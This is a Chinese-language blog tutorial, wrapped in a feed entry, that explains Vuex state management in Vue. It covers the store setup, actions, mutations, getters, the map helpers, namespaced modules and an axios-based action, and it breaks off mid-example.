    <content type="html"><![CDATA[<h1 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h1><h2 id="1-为什么是vuex"><a href="#1-为什么是vuex" class="headerlink" title="1.为什么是vuex"></a>1.为什么是vuex</h2><p>为什么我们需要vuex，我们首先想象一个案例，一个组件的x属性，需要传给其他组件，我们会想到全局事件总线。但同时，这个数据也可以被其他组件修改，这个时候全局事件总线就会显得有一点繁琐。于是我们引入vuex–<strong>既然你的数据共享度那么高，为何不解耦放入一个特定的地方。</strong></p><p><img src="https://s2.loli.net/2022/05/16/sDnkBb1StiUg4jL.png" alt="vuex图解.png"></p><p>我们的vuex的使用场景就是：（简单来说就是共享）</p><p>1.多个组件依赖于同一个状态  2.不同组件改变同一个状态</p><h2 id="2-vuex组成部分"><a href="#2-vuex组成部分" class="headerlink" title="2.vuex组成部分"></a>2.vuex组成部分</h2><p>在vue的官网上给出了vuex的一张图片，解释了vuex 的运行过程：</p><p><img src="https://s2.loli.net/2022/05/16/XiMn32QqoOWgIfz.png" alt="vuex组成.png"></p><p>其中Action，Mutations，State都是vuex的组成部分，而且<strong>都为对象。</strong></p><p>State中保存数据，数据可以是数组等=》（通过render渲染）形成Vue Components =》这个时候调用dispatch 传入Action，结合后端数据，形成一个function，而这个function中就有我们的commit函数=》commit函数传值给Mutations，也得到一个key 和一个function，这个时候的function可以得到我们的 State，通过State改变数据=》达到管理数据的作用</p><p>三个组成部分有一个总的管理者–store，所调用的dispatch和commit都是store下的方法</p><p><img src="https://s2.loli.net/2022/05/16/YT65jPvhAft9Hki.png" alt="store.png"></p><h2 id="3-创建vuex环境"><a href="#3-创建vuex环境" class="headerlink" title="3.创建vuex环境"></a>3.创建vuex环境</h2><p>我们首先安装vuex，vue3使用<code>npm i vuex@4</code>，vue2使用<code>npm i vuex@3</code></p><h3 id="1-创建文件"><a href="#1-创建文件" class="headerlink" title="1.创建文件"></a>1.创建文件</h3><p>在src/store/index.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//该文件用于创建store</span><br><span class="line">//引入vue</span><br><span class="line">import Vue from &quot;vue&quot;;</span><br><span class="line">//引入vuex</span><br><span class="line">import Vuex from &quot;vuex&quot;;</span><br><span class="line">//使用vuex，vuex的使用一定要在store创建之前</span><br><span class="line">Vue.use(Vuex)</span><br><span class="line">//响应组件中的动作</span><br><span class="line">const actions =&#123;&#125;</span><br><span class="line">//操作数据</span><br><span class="line">const mutations = &#123;&#125;</span><br><span class="line">//存储数据</span><br><span class="line">const state = &#123;&#125;</span><br><span class="line"></span><br><span class="line">//创建store并导出</span><br><span class="line">export default new Vuex.Store(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="2-在main-js中导入"><a href="#2-在main-js中导入" class="headerlink" title="2.在main.js中导入"></a>2.在main.js中导入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">//引入vue-resource</span><br><span class="line">import VueResource from &#x27;vue-resource&#x27;</span><br><span class="line">//引入store</span><br><span class="line">import store from &#x27;./store&#x27;//因为index.js是默认文件，所以只写文件夹的名字</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line">Vue.use(VueResource)</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &#x27;#app&#x27;,</span><br><span class="line">    render: h =&gt; h(App),</span><br><span class="line">    //传入store配置项</span><br><span class="line">    store,</span><br><span class="line">    beforeCreate() &#123;</span><br><span class="line">        Vue.prototype.$bus = this//加入事件总线</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4-通过vuex完成加法处理器"><a href="#4-通过vuex完成加法处理器" class="headerlink" title="4.通过vuex完成加法处理器"></a>4.通过vuex完成加法处理器</h2><h3 id="1-完成加减运算"><a href="#1-完成加减运算" class="headerlink" title="1.完成加减运算"></a>1.完成加减运算</h3><p>需求：一个下拉选择框，可以选择3个数字，两个 button，一个是+，一个是-，一个显示得到的总和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">     //html</span><br><span class="line">     &lt;h1&gt;当前求和为：&#123;&#123;$store.state.sum&#125;&#125;&lt;/h1&gt;</span><br><span class="line">     &lt;!-- 需要传输的是数字，添加一个.number --&gt;</span><br><span class="line">     &lt;select v-model.number=&quot;n&quot;&gt;</span><br><span class="line">       &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;</span><br><span class="line">       &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;</span><br><span class="line">       &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;</span><br><span class="line">     &lt;/select&gt;</span><br><span class="line">     &lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt; </span><br><span class="line">     &lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;</span><br><span class="line">     </span><br><span class="line">     //button逻辑</span><br><span class="line">     increment()&#123;</span><br><span class="line">        this.$store.dispatch(&#x27;add&#x27;,this.n)</span><br><span class="line">      &#125;,</span><br><span class="line">      decrement()&#123;</span><br><span class="line">        this.$store.dispatch(&#x27;sub&#x27;,this.n)</span><br><span class="line">      &#125;,</span><br><span class="line">      </span><br><span class="line">      //index.js</span><br><span class="line"> const actions = &#123;</span><br><span class="line">    add(context, value) &#123;//context为上下文，类似于一个minstore</span><br><span class="line">        context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">    &#125;,</span><br><span class="line">    sub(context, value) &#123;</span><br><span class="line">        context.commit(&#x27;SUB&#x27;, value)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;,</span><br><span class="line">const mutations = &#123;</span><br><span class="line">    ADD(state, value) &#123;</span><br><span class="line">        state.sum += value</span><br><span class="line">    &#125;,</span><br><span class="line">    SUB(state, value) &#123;</span><br><span class="line">        state.sum -= value</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组件通过dispatch传输数据给action，action中匹配key值，然后commit数据给mutation，mutation中实际操作数据，并影响state。</p><h3 id="2-实现条件执行"><a href="#2-实现条件执行" class="headerlink" title="2.实现条件执行"></a>2.实现条件执行</h3><p>需求：我们需要添加两个功能，一个是在sum是奇数时才能继续加操作，一个是在点击按钮后一段时间后执行加操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  //html按钮</span><br><span class="line">  &lt;button @click=&quot;incrementOdd&quot;&gt;当前求和奇数再加&lt;/button&gt; </span><br><span class="line">  &lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt; </span><br><span class="line">  </span><br><span class="line">  //click函数</span><br><span class="line">  incrementOdd()&#123;</span><br><span class="line">     this.$store.dispatch(&#x27;addOdd&#x27;,this.n)</span><br><span class="line">   &#125;,</span><br><span class="line">   incrementWait()&#123;</span><br><span class="line">     this.$store.dispatch(&#x27;addWait&#x27;,this.n)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   //index.js--action</span><br><span class="line">addOdd(context, value) &#123;</span><br><span class="line">     if (context.state.sum % 2 == 1) &#123;//sum在context中的state中</span><br><span class="line">         context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> addWait(context, value) &#123;</span><br><span class="line">     setTimeout(() =&gt; &#123;</span><br><span class="line">         context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">     &#125;, 500);</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>这两个最大的特点便是–条件执行，一个是判断，一个是定时器。而这两个逻辑都加载在了<strong>action</strong>中，我们的mutations只负责操作，而action负责数据的逻辑处理，什么时候调用这些操作。</p><h2 id="5-getters"><a href="#5-getters" class="headerlink" title="5.getters"></a>5.getters</h2><p>当state中的数据需要加工后再使用时，我们需要一个类似computed的配置项——getters</p><p>getters既然是配置项，那么我们需要在index.js 中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//准备getters-用于将state中是数据进行加工</span><br><span class="line">const getters = &#123;</span><br><span class="line">    bigSum(state)&#123;</span><br><span class="line">        return state.sum*10</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//记得暴露出去</span><br><span class="line">export default new Vuex.Store(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">    getters,//新建暴露</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后bigSum存在store新建项的getters中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;当前求和放大是10倍为：&#123;&#123;$store.getters.bigSum&#125;&#125;&lt;/h3&gt;</span><br></pre></td></tr></table></figure><h2 id="6-map"><a href="#6-map" class="headerlink" title="6.map"></a>6.map</h2><p>map是vuex对应数据 一种映射，也许听起来十分难懂，我们就来实际操作一下</p><p>根据vue中模板语法要尽量简单的原则，我们的<code>$store.state.sum</code>便显得十分的不简洁，于是我们想到了用计算属性，这样插值语法中就只用写一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum()&#123;</span><br><span class="line">return $store.state.sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样，一旦state中的数据变多，也会很难看</p><h3 id="1-mapState"><a href="#1-mapState" class="headerlink" title="1.mapState"></a>1.mapState</h3><p>所以我们拥有了mapState</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  // ...mapState(&#123; he: &quot;sum&quot; &#125;),//计算属性通过&#x27;sum&#x27;在state中去查找，得到state中的sum，然后计算为he--对象形式</span><br><span class="line">  ...mapState([&quot;sum&quot;,&quot;school&quot;,&quot;subject&quot;]), //或者写成数组形式，得到的计算属性名也是sum</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>mapState实际上返回的是一个对象</p><p><img src="https://s2.loli.net/2022/05/16/XPvsYQVpk6zSj14.png" alt="mapstate返回.png"></p><p>这样的对象放入computed中便可以得到我们想要的效果，而<code>...</code>做到的是将mapstate中的对象挨个取出，放入computed中（es6语法）</p><h3 id="2-mapGetters"><a href="#2-mapGetters" class="headerlink" title="2.mapGetters"></a>2.mapGetters</h3><p>和mapState类似我们加入mapGetters</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...mapGetters([&quot;bigSum&quot;]),</span><br></pre></td></tr></table></figure><h3 id="3-mapMutations"><a href="#3-mapMutations" class="headerlink" title="3.mapMutations"></a>3.mapMutations</h3><p>我们的<code>this.$store.commit(&quot;ADD&quot;, this.n);</code>对应的函数，也可以通过map生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//通过map生成和mutations沟通的dispatch--(对象形式)</span><br><span class="line">...mapMutations(&#123;&#x27;increment&#x27;:&#x27;ADD&#x27;,&#x27;decrement&#x27;:&#x27;SUB&#x27;&#125;),</span><br><span class="line">//mapMutations数组形式</span><br><span class="line">// ...mapMutations([&#x27;increment&#x27;,&#x27;decrement&#x27;]),</span><br></pre></td></tr></table></figure><p>但是需要注意这里没有参数了，所以我们需要在click处绑定参数n</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和奇数再加&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;</span><br></pre></td></tr></table></figure><h3 id="4-mapActions"><a href="#4-mapActions" class="headerlink" title="4.mapActions"></a>4.mapActions</h3><p>与mapMutations类似，<code>this.$store.dispatch(&quot;addOdd&quot;, this.n);</code>对应的函数也可以通过map生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//以上可以写成mapActions</span><br><span class="line">...mapActions(&#123;&#x27;incrementOdd&#x27;:&#x27;addOdd&#x27;,&#x27;incrementWait&#x27;:&#x27;addWait&#x27;&#125;)</span><br></pre></td></tr></table></figure><p>同样有数组形式，这里就不再赘述</p><h2 id="7-组件间共享数据"><a href="#7-组件间共享数据" class="headerlink" title="7.组件间共享数据"></a>7.组件间共享数据</h2><p>我们既然已经拥有了vuex，那么如何做到组件间数据共享呢？</p><p>我们再添加一个person组件，得到的是一个学生姓名列表，而且可以添加学生。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;h1&gt;人员列表&lt;/h1&gt;</span><br><span class="line">  &lt;h3 style=&quot;color : red&quot;&gt;Count组件的和为&#123;&#123;sum&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; placeholder=&quot;请输入学生名&quot; v-model=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;button @click=&quot;addPerson&quot;&gt;添加&lt;/button&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123;p.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>按照上面的操作，我们把personList这个学生列表放入vuex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addPerson() &#123;</span><br><span class="line">  const personObj = &#123; id: nanoid(), name: this.name &#125;;//包装成一个对象</span><br><span class="line">  this.$store.commit(&#x27;add_Person&#x27;, personObj); //因为不用逻辑判断所以直接放入mutations中</span><br><span class="line">  this.name = &#x27;&#x27;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>如何在mutations中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">        add_Person(state, personObj) &#123;//接收传入的personObj</span><br><span class="line">            state.personList.unshift(personObj)//传入数组</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>现在我们需要交互数据：在Count组件中加入读取personList长度的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3 style=&quot;color: red&quot;&gt;Person组件的人数为&#123;&#123; personList.length &#125;&#125;&lt;/h3&gt;</span><br></pre></td></tr></table></figure><p>既然要用这个代码，我们就需要先读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//computed中</span><br><span class="line">...mapState([&quot;sum&quot;, &quot;school&quot;, &quot;subject&quot;, &quot;personList&quot;]), //或者写成数组形式，得到的计算属性名也是sum</span><br></pre></td></tr></table></figure><p>这样就实现了组件间数据的交互</p><h2 id="8-vuex-模块化编程"><a href="#8-vuex-模块化编程" class="headerlink" title="8. vuex 模块化编程"></a>8. vuex 模块化编程</h2><p>在我们用上面方法写vuex的时候容易造成数据和操作的冗杂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> const actions = &#123;</span><br><span class="line">    add(context, value) &#123;//context为上下文，类似于一个minstore</span><br><span class="line">        context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">    &#125;,</span><br><span class="line">    sub(context, value) &#123;</span><br><span class="line">        context.commit(&#x27;SUB&#x27;, value)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;,</span><br><span class="line">const mutations = &#123;</span><br><span class="line">    ADD(state, value) &#123;</span><br><span class="line">        state.sum += value</span><br><span class="line">    &#125;,</span><br><span class="line">    SUB(state, value) &#123;</span><br><span class="line">        state.sum -= value</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有许多来自不同组件的操作那么我们的action将会非常难看</p><p>所以！！！我们拥有了vuex的模块化编程——将属于不同组件的actions，mutations，state按照组件分类</p><p>注意需要添加namespaced，和modules</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">//对数据和操作进行分类</span><br><span class="line">//组件Count</span><br><span class="line">const countOption = &#123;</span><br><span class="line">    namespaced: true,//需要添加namespaced分配空间</span><br><span class="line">    actions: &#123;</span><br><span class="line">        add(context, value) &#123;//context为上下文，类似于一个minstore</span><br><span class="line">            context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">        &#125;,</span><br><span class="line">        sub(context, value) &#123;</span><br><span class="line">            context.commit(&#x27;SUB&#x27;, value)</span><br><span class="line">        &#125;,</span><br><span class="line">        addOdd(context, value) &#123;</span><br><span class="line">            if (context.state.sum % 2 == 1) &#123;//sum在context中的state中</span><br><span class="line">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        addWait(context, value) &#123;</span><br><span class="line">            setTimeout(() =&gt; &#123;</span><br><span class="line">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">            &#125;, 500);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        ADD(state, value) &#123;</span><br><span class="line">            state.sum += value</span><br><span class="line">        &#125;,</span><br><span class="line">        SUB(state, value) &#123;</span><br><span class="line">            state.sum -= value</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    state: &#123;</span><br><span class="line">        sum: 0,</span><br><span class="line">        school: &#x27;swpu&#x27;,</span><br><span class="line">        subject: &#x27;vue&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        bigSum(state) &#123;</span><br><span class="line">            return state.sum * 10</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//组件Person</span><br><span class="line">const personOption = &#123;</span><br><span class="line">    namespaced: true,</span><br><span class="line">    actions: &#123;&#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        add_Person(state, personObj) &#123;//接收传入的personObj</span><br><span class="line">            state.personList.unshift(personObj)//传入数组</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    state: &#123;</span><br><span class="line">        personList: [&#123; id: 1, name: &#x27;张三&#x27; &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//暴露的时候封装成modules</span><br><span class="line">export default new Vuex.Store(&#123;</span><br><span class="line">    modules:&#123;</span><br><span class="line">    countOption:countOption,</span><br><span class="line">    personOption//简写形式</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="map简写的引入"><a href="#map简写的引入" class="headerlink" title="map简写的引入"></a>map简写的引入</h3><p>我们在组件中引入时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...mapState(&quot;countOption&quot;, [&quot;sum&quot;, &quot;school&quot;, &quot;subject&quot;]), //或者写成数组形式，得到的计算属性名也是sum</span><br><span class="line">...mapState(&quot;personOption&quot;, [&quot;personList&quot;]), //两个modules需要单独配置state</span><br></pre></td></tr></table></figure><p>需要先申明所属模块</p><h3 id="常规写法"><a href="#常规写法" class="headerlink" title="常规写法"></a>常规写法</h3><p>但是如果我们的dispatch和commit等不是用map自动生成的呢？</p><p>首先我们看看state中怎么写：<img src="https://s2.loli.net/2022/05/16/lftJyVRzI3dULuq.png" alt="模块化后的state.png"></p><p>模块化后，我们得到的state被分开成了两个部分，而每个部分下分别存了对应的内容</p><p>所以我们的state代码：在state后添加对应的模块名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">personList() &#123;//读取personList</span><br><span class="line">  return this.$store.state.personOption.personList;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>commit代码：需要在personOption后面加/</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.$store.commit( &#x27;personOption/add_Person&#x27;, personObj ); </span><br></pre></td></tr></table></figure><p>dispatch代码：与commit类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.$store.dispatch( &#x27;personOption/addNameWang&#x27;, personObj ); </span><br></pre></td></tr></table></figure><p>getter代码：<img src="https://s2.loli.net/2022/05/16/shi2VtdBlUYAxqa.png" alt="模块化后getter.png"></p><p>可以看到getter模块化后每个属性也变成了和commit类似的/类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firstPerson()&#123;</span><br><span class="line">    return this.$store.getters[&#x27;personOption/firstPerson&#x27;]//因为.和/不能共存，所以改成数组的形式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们的四个属性的常规写法也讲完了</p><h3 id="分类成文件"><a href="#分类成文件" class="headerlink" title="分类成文件"></a>分类成文件</h3><p>但是当我们的组件比较多的时候，我们这样子写也会显得冗杂，那么我们就在store文件夹下新建文件，分别叫Count.js Person.js 代表我们的两个组件，把他们两个暴露出来，再在index中引入就好了。</p><p>例如Count：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">    namespaced: true,</span><br><span class="line">    actions: &#123;</span><br><span class="line">        add(context, value) &#123;//context为上下文，类似于一个minstore</span><br><span class="line">            context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">        &#125;,</span><br><span class="line">        sub(context, value) &#123;</span><br><span class="line">            context.commit(&#x27;SUB&#x27;, value)</span><br><span class="line">        &#125;,</span><br><span class="line">        addOdd(context, value) &#123;</span><br><span class="line">            if (context.state.sum % 2 == 1) &#123;//sum在context中的state中</span><br><span class="line">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        addWait(context, value) &#123;</span><br><span class="line">            setTimeout(() =&gt; &#123;</span><br><span class="line">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="line">            &#125;, 500);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//引入模块Count和Person</span><br><span class="line">import countOption from &quot;./Count&quot;;</span><br><span class="line">import personOption from &quot;./Person&quot;;</span><br></pre></td></tr></table></figure><p>这样子我们的代码就变得更加简洁了</p><h3 id="发送请求方式写actions"><a href="#发送请求方式写actions" class="headerlink" title="发送请求方式写actions"></a>发送请求方式写actions</h3><p>但是有些情况下我们是通过axios发送请求获取数据再提交commit的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//给服务器发请求</span><br><span class="line">addPersonServer(context) &#123;</span><br><span class="line">    axios.get(&#x27;https://api.uixsj.cn/hitokoto/get?type=social&#x27;).then(</span><br><span class="line">        response =&gt; &#123;</span><br><span class="line">            context.commit(&#x27;add_Person&#x27;, 